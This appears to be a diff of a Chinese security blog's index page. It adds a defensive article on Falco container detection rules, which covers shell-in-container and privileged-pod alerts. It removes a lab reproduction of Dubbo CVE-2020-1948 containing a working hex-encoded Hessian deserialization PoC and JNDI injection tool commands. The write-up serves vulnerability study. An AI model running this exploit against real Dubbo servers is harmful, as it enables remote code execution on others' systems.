@@ -82,6 +82,137 @@
 
     
         <h2 class="title">
+            <a href="/2026/01/21/Falco/">
+                深入浅出 Falco：容器运行时安全利器
+            </a>
+        </h2>
+    
+    <time>
+        Jan 21, 2026
+    </time>
+    <section class="content">
+        <h1><span id="深入浅出-falco容器运行时安全利器">深入浅出 Falco：容器运行时安全利器</span></h1><blockquote>
+<p>本文转自 <a target="_blank" rel="noopener" href="https://www.webkt.com/article/8448">容器安全砖家</a> 并作补充</p>
+<p>“哎，哥们，最近容器安全这块儿搞得怎么样？”</p>
+<p>“别提了，头疼！容器这玩意儿，跑起来是爽，可安全问题真让人挠头。你知道的，传统的那一套安全方案，在容器环境下总感觉差点意思。”</p>
+<p>“是啊，容器的隔离性、动态性，还有镜像的复杂性，都给安全带来了新的挑战。不过，我最近发现了一个好东西——Falco，感觉能解决不少问题。”</p>
+<p>“Falco？听起来有点耳熟，但具体是干啥的？”</p>
+<p>“Falco 是一个开源的容器运行时安全工具，它就像一个‘显微镜’，能实时监控容器内部的一举一动，发现那些鬼鬼祟祟的异常行为。”</p>
+</blockquote>
+<h2><span id="falco-的核心原理系统调用监控">Falco 的核心原理：系统调用监控</span></h2><blockquote>
+<p>“听起来挺厉害的，它怎么做到的？”</p>
+<p>“Falco 的核心原理其实很简单，就是监控系统调用（syscall）。你想啊，容器里的应用，不管干啥，最终都要通过系统调用和内核打交道。Falco 就守在系统调用这个‘关卡’，任何进出内核的数据都逃不过它的眼睛。”</p>
+<p>“有点像海关安检？”</p>
+<p>“没错！Falco 通过 eBPF 技术（Extended Berkeley Packet Filter），在内核层面‘安装’了一个探针，这个探针能捕获所有的系统调用事件。eBPF 的好处是，它不需要修改内核代码，而且性能开销很小，对容器的运行几乎没有影响。”</p>
+<p>“那 Falco 怎么判断哪些系统调用是异常的呢？”</p>
+<p>“这就是 Falco 的另一个核心组件——规则引擎。Falco 预定义了一套丰富的规则，这些规则描述了各种异常行为的特征。比如，‘容器内执行了 shell’、‘向敏感目录写入文件’、‘反向 shell 连接’等等。”</p>
+<p>“这些规则听起来就很实用！”</p>
+<p>“是啊，Falco 的规则引擎非常强大，你可以根据自己的需求定制规则。比如，你可以定义一个规则，只允许特定的容器访问特定的网络端口，或者只允许特定的用户在容器内执行命令。”</p>
+</blockquote>
+<h2><span id="falco-的规则灵活-强大-可定制">Falco 的规则：灵活、强大、可定制</span></h2><blockquote>
+<p>“Falco 的规则怎么写？复杂吗？”</p>
+<p>“Falco 的规则使用 YAML 格式编写，非常简单易懂。一个规则通常包含以下几个部分：</p>
+<ul>
+<li><strong>规则名称（rule）</strong>：给规则起个名字，方便识别。</li>
+<li><strong>描述（desc）</strong>：用一句话描述规则的作用。</li>
+<li><strong>条件（condition）</strong>：定义规则的触发条件，这是规则的核心。</li>
+<li><strong>输出（output）</strong>：当规则被触发时，输出的信息。</li>
+<li><strong>优先级（priority）</strong>：定义规则的严重程度，比如 EMERGENCY、ALERT、CRITICAL、ERROR、WARNING、NOTICE、INFO、DEBUG。</li>
+<li><strong>标签（tags）</strong>：给规则打上标签，方便分类和管理。</li>
+</ul>
+<p>举个例子，下面是一个检测容器内执行 shell 的规则：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">rule:</span> <span class="string">Terminal</span> <span class="string">shell</span> <span class="string">in</span> <span class="string">container</span></span><br><span class="line">  <span class="attr">desc:</span> <span class="string">A</span> <span class="string">shell</span> <span class="string">was</span> <span class="string">spawned</span> <span class="string">in</span> <span class="string">a</span> <span class="string">container</span> <span class="string">with</span> <span class="string">an</span> <span class="string">attached</span> <span class="string">terminal.</span></span><br><span class="line">  <span class="attr">condition:</span> <span class="string">spawned_process</span> <span class="string">and</span> <span class="string">container</span> <span class="string">and</span> <span class="string">shell_procs</span> <span class="string">and</span> <span class="string">interactive</span></span><br><span class="line">  <span class="attr">output:</span> <span class="string">&gt;</span></span><br><span class="line"><span class="string">    A shell was spawned in a container with an attached terminal (user=%user.name container_id=%container.id container_name=%container.name shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline terminal=%fd.num)</span></span><br><span class="line"><span class="string"></span>   <span class="attr">priority:</span> <span class="string">WARNING</span></span><br><span class="line">  <span class="attr">tags:</span> [<span class="string">container</span>, <span class="string">shell</span>, <span class="string">mitre_execution</span>]</span><br></pre></td></tr></table></figure>
+
+<p>这个规则的条件是 <code>spawned_process and container and shell_procs and interactive</code>，意思是：</p>
+<ol>
+<li><code>spawned_process</code>：有新进程产生。</li>
+<li><code>container</code>：事件发生在容器内。</li>
+<li><code>shell_procs</code>：进程是 shell 进程（比如 bash、zsh）。</li>
+<li><code>interactive</code>：进程连接了终端。</li>
+</ol>
+<p>当这个规则被触发时，会输出类似下面的信息：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A shell was spawned <span class="keyword">in</span> a container <span class="keyword">with</span> an attached terminal (<span class="keyword">user</span><span class="operator">=</span>root container_id<span class="operator">=</span>a1b2c3d4e5f6 container_name<span class="operator">=</span>my<span class="operator">-</span>container shell<span class="operator">=</span>bash parent<span class="operator">=</span>dockerd cmdline<span class="operator">=</span>bash terminal<span class="operator">=</span><span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>“这规则看起来确实不难，条件表达式也很灵活。”</p>
+<p>“是啊，Falco 的条件表达式支持各种操作符，比如 <code>and</code>、<code>or</code>、<code>not</code>、<code>=</code>、<code>!=</code>、<code>&gt;</code>、<code>&lt;</code>、<code>contains</code>、<code>startswith</code>、<code>endswith</code> 等等，你可以用这些操作符构建非常复杂的条件。”</p>
+</blockquote>
+<h2><span id="falco-与-kubernetes-集成如虎添翼">Falco 与 Kubernetes 集成：如虎添翼</span></h2><blockquote>
+<p>“Falco 这么好用，能和 Kubernetes 集成吗？”</p>
+<p>“当然可以！Falco 和 Kubernetes 是‘天生一对’。Falco 可以通过 Kubernetes API 获取容器的元数据，比如容器的名称、命名空间、Pod 信息等等。这些信息可以用来丰富 Falco 的输出，让你更容易定位问题。”</p>
+<p>“怎么集成？”</p>
+<p>“Falco 官方提供了 Helm Chart，你可以用 Helm 一键部署 Falco。部署完成后，Falco 会以 DaemonSet 的形式运行在 Kubernetes 集群的每个节点上，监控所有容器的活动。”</p>
+<p>“那 Falco 的告警怎么处理？总不能一直盯着日志看吧？”</p>
+<p>“Falco 支持多种告警方式，你可以把告警信息发送到：</p>
+<ul>
+<li><strong>标准输出（stdout）</strong>：直接在 Falco 的日志里查看。</li>
+<li><strong>文件</strong>：把告警信息保存到文件里。</li>
+<li><strong>Syslog</strong>：发送到 Syslog 服务器。</li>
+<li><strong>HTTP(S) 端点</strong>：发送到 Webhook，你可以用 Webhook 把告警信息转发到 Slack、钉钉等平台。</li>
+<li><strong>gRPC 端点</strong>：通过 gRPC 协议发送到自定义的告警处理程序。</li>
+</ul>
+<p>“太方便了！这样就可以实现自动化告警和响应了。”</p>
+</blockquote>
+<h2><span id="falco-与-kubernetes-审计日志集成更上一层楼">Falco 与 Kubernetes 审计日志集成：更上一层楼</span></h2><blockquote>
+<p>“对了，Falco 能不能和 Kubernetes 的审计日志集成？”</p>
+<p>“当然可以！这是 Falco 的一个高级用法。Kubernetes 的审计日志记录了所有对 Kubernetes API 的请求，比如创建 Pod、删除 Deployment、修改 ConfigMap 等等。Falco 可以读取 Kubernetes 的审计日志，并根据审计日志中的事件触发规则。”</p>
+<p>“这有什么用？”</p>
+<p>“这能让你发现更深层次的安全问题。比如，你可以定义一个规则，检测是否有人创建了具有特权的容器（privileged container），或者是否有人修改了网络策略，允许了不该允许的流量。”</p>
+<p>“怎么配置？”</p>
+<p>“你需要先开启 Kubernetes 的审计日志功能，并配置一个 Webhook 后端，把审计日志发送到 Falco。然后，在 Falco 的规则里，你可以使用 <code>k8s_audit</code> 前缀来引用审计日志中的字段。”</p>
+<p>举个例子，下面是一个检测创建特权容器的规则：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">rule:</span> <span class="string">Create</span> <span class="string">Privileged</span> <span class="string">Pod</span></span><br><span class="line">  <span class="attr">desc:</span> <span class="string">Detect</span> <span class="string">the</span> <span class="string">creation</span> <span class="string">of</span> <span class="string">privileged</span> <span class="string">pods.</span></span><br><span class="line">  <span class="attr">condition:</span> <span class="string">k8s_audit.request.object.spec.containers[*].securityContext.privileged=true</span></span><br><span class="line">  <span class="attr">output:</span> <span class="string">&gt;</span></span><br><span class="line"><span class="string">    Privileged pod created (user=%k8s_audit.user.username pod=%k8s_audit.request.object.metadata.name namespace=%k8s_audit.request.object.metadata.namespace)</span></span><br><span class="line"><span class="string"></span>   <span class="attr">priority:</span> <span class="string">WARNING</span></span><br><span class="line">  <span class="attr">tags:</span> [<span class="string">k8s</span>, <span class="string">security</span>, <span class="string">mitre_privilege_escalation</span>]</span><br></pre></td></tr></table></figure>
+
+<p>这个规则的条件是 <code>k8s_audit.request.object.spec.containers[*].securityContext.privileged=true</code>，意思是：</p>
+<ul>
+<li><code>k8s_audit</code>：事件来自 Kubernetes 审计日志。</li>
+<li><code>request.object</code>：请求的对象。</li>
+<li><code>spec.containers[*]</code>：所有的容器。</li>
+<li><code>securityContext.privileged</code>：容器的安全上下文中的 <code>privileged</code> 字段。</li>
+<li><code>=true</code>：<code>privileged</code> 字段的值为 <code>true</code>。</li>
+</ul>
+<p>当这个规则被触发时，会输出类似下面的信息：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Privileged pod created (<span class="keyword">user</span><span class="operator">=</span>admin pod<span class="operator">=</span>my<span class="operator">-</span>privileged<span class="operator">-</span>pod namespace<span class="operator">=</span><span class="keyword">default</span>)</span><br></pre></td></tr></table></figure>
+
+<p>“这简直是‘火眼金睛’啊！有了 Falco，再也不怕那些‘偷偷摸摸’的操作了。”</p>
+</blockquote>
+<h2><span id="falco-最佳实践让安全更进一步">Falco 最佳实践：让安全更进一步</span></h2><blockquote>
+<p>“用 Falco 有什么最佳实践吗？”</p>
+<p>“当然有！</p>
+<ol>
+<li><strong>从默认规则开始</strong>：Falco 自带了一套非常全面的规则，覆盖了常见的容器安全威胁。你可以先从这些默认规则开始，然后根据自己的需求逐步调整和优化。</li>
+<li><strong>定期审查和更新规则</strong>：安全威胁是不断变化的，Falco 的规则也需要定期更新。Falco 社区非常活跃，会定期发布新的规则和更新。你应该定期关注 Falco 的官方博客和 GitHub 仓库，及时更新规则。</li>
+<li><strong>自定义规则</strong>：不要满足于默认规则，要根据自己的业务特点和安全需求，定制自己的规则。比如，你可以定义规则来监控特定的应用程序、特定的用户、特定的网络流量等等。</li>
+<li><strong>白名单</strong>：有些正常的系统调用可能会被 Falco 误报，比如一些监控工具、调试工具产生的系统调用。你可以通过白名单机制，把这些正常的系统调用排除在外，减少误报。</li>
+<li><strong>告警分级</strong>：Falco 的规则有不同的优先级，你应该根据规则的优先级，设置不同的告警级别。比如，对于 EMERGENCY 和 ALERT 级别的规则，你应该立即响应；对于 WARNING 和 NOTICE 级别的规则，你可以稍后处理。</li>
+<li><strong>自动化响应</strong>：不要只停留在告警层面，要实现自动化响应。比如，当 Falco 检测到容器内执行了 shell，你可以自动终止容器，或者隔离容器所在的节点。</li>
+<li><strong>与其他安全工具集成</strong>：Falco 不是万能的，它只是容器安全体系中的一环。你应该把 Falco 与其他安全工具集成起来，比如镜像扫描工具、漏洞扫描工具、入侵检测系统等等，构建一个多层次的安全防御体系。</li>
+</ol>
+<p>“太感谢了！有了 Falco，我对容器安全更有信心了。”</p>
+<p>“别客气！安全无小事，咱们一起努力，把容器安全搞好！”</p>
+</blockquote>
+<h2><span id="总结">总结</span></h2><blockquote>
+<p>总的来说，Falco 是一款非常优秀的容器运行时安全工具。它利用系统调用监控和强大的规则引擎，能够实时检测容器中的异常行为，并与 Kubernetes 完美集成。通过合理配置和使用 Falco，你可以大大提高容器环境的安全性。</p>
+<p>希望这篇文章能帮助你更好地了解和使用 Falco，让你的容器更安全！</p>
+<p>“对了，还有个问题，Falco 会不会影响容器的性能？”</p>
+<p>“这是个好问题！Falco 使用 eBPF 技术，性能开销非常小。在大多数情况下，Falco 对容器性能的影响可以忽略不计。当然，如果你配置了非常复杂的规则，或者你的容器产生了大量的系统调用，可能会对性能产生一定的影响。所以，在生产环境中使用 Falco 之前，最好先进行充分的测试。”</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Falco/" rel="tag">Falco</a><a class="tag-none-link" href="/tags/Process/" rel="tag">Process</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2025/12/19/CVE-2025-24016-Wazuh/">
                 两大僵尸网络，一个漏洞：Mirai 利用 Wazuh 漏洞传播
             </a>
@@ -1175,197 +1306,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/IAST/" rel="tag">IAST</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2025/12/11/CVE-2020-1948-Apache-Dubbo/">
-                Dubbo 漏洞 CVE-2020-1948 复现+简单修复
-            </a>
-        </h2>
-    
-    <time>
-        Dec 11, 2025
-    </time>
-    <section class="content">
-        <h1><span id="dubbo-漏洞-cve-2020-1948-复现简单修复">Dubbo 漏洞 CVE-2020-1948 复现+简单修复</span></h1><blockquote>
-<p>本文转自 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/JingQ/p/13329083.html">JingQ</a> 并作补充</p>
-<p>关注该漏洞的童鞋，应该对 <code>Dubbo</code> 这个架构优秀的 <code>RPC</code> 框架不陌生，所以直入主题</p>
-</blockquote>
-<h2><span id="漏洞详情">漏洞详情</span></h2><blockquote>
-<p>腾讯安全玄武实验室研究员发现，<code>Dubbo 2.7.6</code> 或更低版本采用的默认反序列化方式存在代码执行漏洞，当 <code>Dubbo</code> 服务端暴露时(默认端口：20880)，攻击者可以发送未经验证的服务名或方法名的RPC请求，同时配合附加恶意的参数负载。当恶意参数被反序列化时，它将执行恶意代码。</p>
-<p>经验证该反序列化漏洞需要服务端存在可以被利用的第三方库，而研究发现极大多数开发者都会使用的某些第三方库存在能够利用的攻击链，攻击者可以利用它们直接对 <code>Dubbo</code> 服务端进行恶意代码执行，影响广泛。</p>
-</blockquote>
-<h3><span id="影响版本">影响版本</span></h3><blockquote>
-<p>dubbo 2.7.6 以下的版本</p>
-</blockquote>
-<h3><span id="复现环境">复现环境</span></h3><blockquote>
-<ul>
-<li>mac 10.15</li>
-<li>idea 2020.1</li>
-<li>jdk-8u151（<a target="_blank" rel="noopener" href="https://www.oracle.com/webapps/redirect/signon?nexturl=https://download.oracle.com/otn/java/jdk/8u151-b12/e758a0de34e24606bca991d704f6dcbf/jdk-8u151-macosx-x64.dmg">下载地址</a>）</li>
-</ul>
-</blockquote>
-<h3><span id="漏洞注入简介">漏洞注入简介</span></h3><blockquote>
-<p>漏洞发现者 <code>rui0</code>，使用 <code>Remo</code> 模块，最终是通过 <code>JdbcRowSetImpl</code> 调用 <code>jndi</code> 来进行远程代码执行</p>
-<p><strong>由于该场景复现依赖于低版本的 jdk，之前使用 jdk-8u221 没能复现，去官网下载回低版本，使用低版本后成功复现</strong></p>
-</blockquote>
-<h2><span id="名词解释">名词解释</span></h2><blockquote>
-<ul>
-<li><strong>PoC：</strong> <code>Proof Of Concept</code> 的缩写。在黑客圈指：观点验证程序。</li>
-<li><strong>CVE：</strong> <code>Common Vulnerabilities &amp; Exposures</code> 通用漏洞披露。</li>
-<li><strong>Exp</strong>：<code>Exploit</code>，在安全方面，翻译为 「利用」，指利用漏洞进行攻击的动作。</li>
-<li><strong>Payload</strong>：翻译为「有效负荷」，指成功 <code>exploit</code> 后，在目标系统执行的代码或指令。</li>
-<li><strong>RCE</strong>：<code>remote code execution</code> 远程命令执行，简称 <code>RCE</code> 漏洞。</li>
-<li><strong>RMI：</strong> 专为 <code>Java</code> 环境设计的远程方法调用机制，远程服务器实现具体的 <code>Java</code> 方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法并获取执行结果，使分布在不同的 <code>JVM</code> 中的对象的外表和行为都像本地对象一样。</li>
-<li><strong>LDAP：</strong> 轻量级目录访问协议，目录服务是一种以树状结构的目录数据库为基础，外加各种访问协议的信息查询服务</li>
-<li><strong>JNDI：</strong> <code>Java Naming and Directory Interface</code>，包括 <code>Naming Server</code> 和 <code>Directory Server</code>。是一种 <code>Java API</code>，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。</li>
-</ul>
-<p>以上大概就是本次漏洞所涉及到的专业名词，先有个大概了解，后面的内容看的应该比较明白。</p>
-</blockquote>
-<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
-<p>复现场景翻阅了很多篇文章和尝试，发现通过别人构造的 <code>payload</code> 来复现最为简单，所以这里记录一下复现的流程</p>
-</blockquote>
-<h3><span id="模拟-provider">模拟 Provider</span></h3><blockquote>
-<p>攻击依赖于 <code>rome</code> 工具包中的 <code>ToStringBean</code> 工具，所以无论下载什么提供者项目，都需要将以下依赖加入到 <code>POM.xml</code> 文件中</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.rometools<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>以 <code>dubbo-spring-boot-project</code> 说明</p>
-<ul>
-<li>一、在 <code>github</code> 下载示例代码，切换分支到 2.7.6 或更早之前</li>
-<li>二、在 <code>pom.xml</code> 中加入上面提到的 <code>remo</code> 依赖</li>
-<li>三、打包启动</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 下载</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/apache/dubbo-spring-boot-project.git</span><br><span class="line">// 切换分支</span><br><span class="line">$ git checkout 2.7.6</span><br><span class="line">// 添加完依赖后，打包</span><br><span class="line">$ mvn clean install -DskipTests</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2025/12/11/CVE-2020-1948-Apache-Dubbo/1.png" alt="image"></p>
-<ul>
-<li>四、启动服务提供者</li>
-</ul>
-<p>启动的时候，注意要用低版本的 <code>JDK</code>，使用 <code>IDEA</code> 的话，可以在这里选择编译运行的 <code>JRE</code></p>
-<p><img src="/2025/12/11/CVE-2020-1948-Apache-Dubbo/2.png" alt="image"></p>
-<p>接着启动 <code>Provier</code> 即可</p>
-</blockquote>
-<h3><span id="运行-jndi-程序">运行 JNDI 程序</span></h3><blockquote>
-<p>使用了该位大佬的 <code>PoC</code>，里面注入的 <code>URL</code> 是 <code>ldap://127.0.0.1:1389/Exploit</code>，具体原理可以 <a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md">参考资料六</a></p>
-<p>具体原理说明：</p>
-<p><img src="/2025/12/11/CVE-2020-1948-Apache-Dubbo/3.png" alt="image"></p>
-<p>以下内容引用自 <a target="_blank" rel="noopener" href="https://www.sayers.top/cve_2020_1948.html">Apache Dubbo Provider反序列化漏洞(CVE-2020-1948) 利用复现及POC</a></p>
-<ul>
-<li>一、下载注入工具代码</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/sayers522/JNDI-Injection-Exploit</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>二、编译工具包，在 <code>target</code> 目录生成</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mvn clean install -DskipTests</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>三、运行 <code>JNDI</code> 工具包</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [<span class="built_in">command</span>] [-A] [address]</span><br></pre></td></tr></table></figure>
-
-<p>例如测试时，执行的命令是打开计算器，可以执行下面命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;open /System/Applications/Calculator.app&quot;</span> -A 127.0.0.1</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h3><span id="构造-poc">构造 POC</span></h3><blockquote>
-<p>编辑以下 Python 脚本，触发 dubbo provider 反序列化，例如以漏洞名来命名为 <code>2020_1948.py</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendEvilObjData</span>(<span class="params">sock</span>):</span><br><span class="line">	payload=<span class="string">&quot;DABBC20000000000000000000000037805322E302E3230366F72672E6170616368652E647562626F2E737072696E672E626F6F742E64656D6F2E636F6E73756D65722E44656D6F5365727669636505312E302E300474657374124C6A6176612F6C616E672F4F626A6563743B48433027636F6D2E726F6D65746F6F6C732E726F6D652E666565642E696D706C2E457175616C734265616E92036F626A096265616E436C61737360433029636F6D2E726F6D65746F6F6C732E726F6D652E666565642E696D706C2E546F537472696E674265616E92036F626A096265616E436C61737361431D636F6D2E73756E2E726F777365742E4A646263526F77536574496D706CAC06706172616D73096C697374656E657273036D61700A6368617253747265616D0B617363696953747265616D0D756E69636F646553747265616D0C62696E61727953747265616D0F7374724D61746368436F6C756D6E730D694D61746368436F6C756D6E73057265734D4406726F77734D4402727302707304636F6E6E09666574636853697A650866657463684469720969736F6C6174696F6E1065736361706550726F63657373696E6708726561644F6E6C790B636F6E63757272656E63790C6D61784669656C6453697A65076D6178526F77730C717565727954696D656F75740B73686F7744656C657465640A726F77536574547970650A64617461536F757263650355524C07636F6D6D616E64624D136A6176612E7574696C2E486173687461626C655A4E4E4E4E4E4E56106A6176612E7574696C2E566563746F729A03666F6F4E4E4E4E4E4E4E4E4E56919A8F8F8F8F8F8F8F8F8F8F4E4E4E4E4E90CBE8925454CBF090909046CBEC1D6C6461703A2F2F3132372E302E302E313A313338392F4578706C6F69744E4E430F6A6176612E6C616E672E436C61737391046E616D65631D636F6D2E73756E2E726F777365742E4A646263526F77536574496D706C633029636F6D2E726F6D65746F6F6C732E726F6D652E666565642E696D706C2E546F537472696E674265616E5191519151915A48047061746830366F72672E6170616368652E647562626F2E737072696E672E626F6F742E64656D6F2E636F6E73756D65722E44656D6F5365727669636509696E7465726661636530366F72672E6170616368652E647562626F2E737072696E672E626F6F742E64656D6F2E636F6E73756D65722E44656D6F536572766963650776657273696F6E05312E302E305A&quot;</span></span><br><span class="line">	sock.send(payload.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">dip,dport</span>):</span><br><span class="line">	sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">	server_addr=(dip,dport)</span><br><span class="line">	sock.connect(server_addr)</span><br><span class="line">	sendEvilObjData(sock)</span><br><span class="line"></span><br><span class="line">run(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">12345</span>)</span><br></pre></td></tr></table></figure>
-
-<p><strong>最终复现效果：</strong></p>
-<p><img src="/2025/12/11/CVE-2020-1948-Apache-Dubbo/4.gif" alt="image"></p>
-</blockquote>
-<h3><span id="漏洞小结">漏洞小结</span></h3><blockquote>
-<ul>
-<li>1、下载 <code>demo</code> 代码，加入 <code>rome</code> 依赖</li>
-<li>2、启动 <code>JNDI</code> 服务</li>
-<li>3、构造 <code>2020-1948.py</code> Poc 攻击</li>
-</ul>
-</blockquote>
-<h2><span id="漏洞原理简述">漏洞原理简述</span></h2><blockquote>
-<p>网上公布的 <code>PoC</code> 代码</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from dubbo.codec.hessian2 <span class="keyword">import</span> Decoder,new_object</span><br><span class="line">from dubbo.client <span class="keyword">import</span> <span class="type">DubboClient</span></span><br><span class="line"></span><br><span class="line"><span class="variable">client</span> <span class="operator">=</span> DubboClient(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">JdbcRowSetImpl=new_object(</span><br><span class="line">      <span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span>,</span><br><span class="line">      dataSource=<span class="string">&quot;ldap://127.0.0.1:8087/#ExportObject&quot;</span>,</span><br><span class="line">      strMatchColumns=[<span class="string">&quot;foo&quot;</span>]</span><br><span class="line">      )</span><br><span class="line">JdbcRowSetImplClass=new_object(</span><br><span class="line">      <span class="string">&#x27;java.lang.Class&#x27;</span>,</span><br><span class="line">      name=<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">      )</span><br><span class="line">toStringBean=new_object(</span><br><span class="line">      <span class="string">&#x27;com.rometools.rome.feed.impl.ToStringBean&#x27;</span>,</span><br><span class="line">      beanClass=JdbcRowSetImplClass,</span><br><span class="line">      obj=JdbcRowSetImpl</span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">resp = client.send_request_and_return_response(</span><br><span class="line">    service_name=<span class="string">&#x27;org.apache.dubbo.spring.boot.demo.consumer.DemoService&#x27;</span>,</span><br><span class="line">    method_name=<span class="string">&#x27;rce&#x27;</span>,</span><br><span class="line">    args=[toStringBean])</span><br></pre></td></tr></table></figure>
-
-<p>本次漏洞利用的是 <code>com.rometools.rome.feed.impl.ToStringBean#toString</code> 方法，重写了 <code>toString</code>，该方法将会调用构造对象的所有 <code>getter</code> 方法</p>
-<p><img src="/2025/12/11/CVE-2020-1948-Apache-Dubbo/5.png" alt="image"></p>
-<p>从上面 <code>PoC</code> 可以看到，执行 <code>Dubbo</code> 调用时，传入的是 <code>ToStringBean</code> 类型参数，构造的对象是<code>com.sun.rowset.JdbcRowSetImpl</code>，并且 <code>datasource</code> 属性设置的是 <code>JNDI</code> 暴露的 <code>url</code>，在调用 <code>JdbcRowSetImpl</code> 的 <code>getDatabaseMetaData</code> 方法时，执行 <code>connect</code> 操作，下载远端代码，在 <code>Service Provider</code> 执行，造成攻击。</p>
-<p><img src="/2025/12/11/CVE-2020-1948-Apache-Dubbo/6.png" alt="image"></p>
-<p>调起 <code>toString</code> 方法的地方是在 <code>Dubbo Provider</code> 接收 <code>DecodeHandler#received:44</code> 请求，在 <code>DecodeableRpcInvocation#decode</code> 反序列化参数的地方：</p>
-<p><img src="/2025/12/11/CVE-2020-1948-Apache-Dubbo/7.png" alt="image"></p>
-<p><code>dubbo</code> 默认使用的是 <code>hession2</code> 序列化，解析参数执行的是这个方法</p>
-<blockquote>
-<p>org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput#readUTF</p>
-</blockquote>
-<p>在 <code>hession</code> 反序列化过程中，通过下面代码段执行到了 <code>ToStringBean#toString</code></p>
-<p><img src="/2025/12/11/CVE-2020-1948-Apache-Dubbo/8.png" alt="image"></p>
